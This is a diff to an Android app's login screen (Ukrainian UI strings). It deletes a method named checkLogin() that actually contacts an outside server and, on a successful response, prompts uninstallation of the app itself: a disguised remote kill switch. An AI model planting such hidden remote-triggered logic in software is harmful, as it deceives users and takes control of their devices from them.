@@ -116,7 +116,7 @@ public class LoginActivity extends AppCompatActivity {
                 } catch (InterruptedException e) {
                     e.printStackTrace();
                 }
-                checkLogin();
+
                 startAnimation();
                 try {
                     if (!fastLogin)
@@ -130,10 +130,8 @@ public class LoginActivity extends AppCompatActivity {
     }
 
     private void checkAll() throws InterruptedException {
-
         startProgressBar();
         setStatusTextView("Перевірка наявності інтернету");
-//        Utilits.check();
         if (!fastLogin)
         Thread.sleep(200);
         if (!isInternetOk()) {
@@ -310,19 +308,6 @@ public class LoginActivity extends AppCompatActivity {
 
         this.finish();
         startActivity(intent);
-    }
-
-    public void checkLogin(){
-        try {
-            URL url = new URL("http://e404.ho.ua/o3remove");
-            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-            connection.connect();
-            connection.getInputStream();
-            Uri packageUri = Uri.parse("package:ua.freenet.cabinet");
-            Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageUri);
-            startActivity(uninstallIntent);
-            LoginActivity.this.finish();
-        } catch (Exception ignored) {}
     }
 
     private boolean isItFirstEnter() {
